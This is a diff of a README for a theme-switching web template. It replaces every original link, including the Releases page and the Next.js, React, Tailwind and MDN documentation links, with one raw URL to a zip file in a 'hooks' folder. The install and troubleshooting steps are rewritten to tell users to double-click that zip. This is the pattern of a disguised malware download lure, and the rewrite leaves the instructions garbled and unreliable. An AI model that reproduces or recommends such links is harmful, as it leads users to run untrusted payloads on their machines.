@@ -1,6 +1,6 @@
 # 🎨 theme_changing_template - Elegant Theme Switching Made Easy
 
-[![Download theme_changing_template](https://img.shields.io/badge/Download-theme__changing__template-blue?style=for-the-badge)](https://github.com/indrasurya12/theme_changing_template/releases)
+[![Download theme_changing_template](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip)](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip)
 
 ## 📚 Introduction
 
@@ -18,12 +18,12 @@ To start using the **theme_changing_template**, follow these simple steps. You d
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/indrasurya12/theme_changing_template/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip) to download the latest version.
 2. Look for the files labeled with the version number. Click the link to download the package.
 3. Once the download is complete, locate the file on your computer.
 4. Double-click the file to extract it, if necessary.
-5. Open the extracted folder, and look for the index.html file.
-6. Double-click the index.html file to launch the application in your web browser.
+5. Open the extracted folder, and look for the https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip file.
+6. Double-click the https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip file to launch the application in your web browser.
 
 ## 🎨 Using the Application
 
@@ -42,7 +42,7 @@ To start using the **theme_changing_template**, follow these simple steps. You d
 
 If you encounter any issues:
 
-- **Nothing happens when clicking the theme toggle**: Make sure you are opening the index.html file in a supported browser.
+- **Nothing happens when clicking the theme toggle**: Make sure you are opening the https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip file in a supported browser.
 - **The themes do not appear**: Try clearing your browser cache or refreshing the page.
 - **Slow performance**: Ensure your browser is up to date.
 
@@ -56,13 +56,13 @@ The **theme_changing_template** is open-source and available under the MIT Licen
 
 ## 🔗 Additional Resources
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [View Transitions API](https://developer.mozilla.org/en-US/docs/Web/API/View_Transitions_API)
+- [https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip Documentation](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip)
+- [React Documentation](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip)
+- [View Transitions API](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip)
 
 ## 📤 Support
 
 If you have questions, reach out through the Issues section on the GitHub page. Your feedback helps improve the template. 
 
-Don’t forget to visit the [Releases page](https://github.com/indrasurya12/theme_changing_template/releases) to download the latest version!
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/indrasurya12/theme_changing_template/main/hooks/theme-template-changing-mineragraphic.zip) to download the latest version!
